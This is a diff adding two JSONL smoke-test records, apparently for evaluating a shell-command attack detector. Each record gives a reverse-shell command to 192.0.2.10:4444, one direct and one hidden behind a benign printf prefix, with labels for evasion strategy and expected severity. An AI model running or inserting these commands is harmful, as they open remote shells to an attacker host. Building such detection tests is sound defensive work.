@@ -1,0 +1,2 @@
+{"id":"smoke-1","category":"reverse_shell","attack_family":"reverse_shell","intent":"smoke","command":"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1","evasion_strategy":"direct","rationale":"smoke","severity_expected":"high"}
+{"id":"smoke-2","category":"benign_wrapper","attack_family":"reverse_shell","intent":"smoke","command":"printf 'ready\\n'; bash -c 'exec 3<>/dev/tcp/192.0.2.10/4444; cat <&3 & cat >&3'","evasion_strategy":"benign_prefix","rationale":"smoke","severity_expected":"high"}
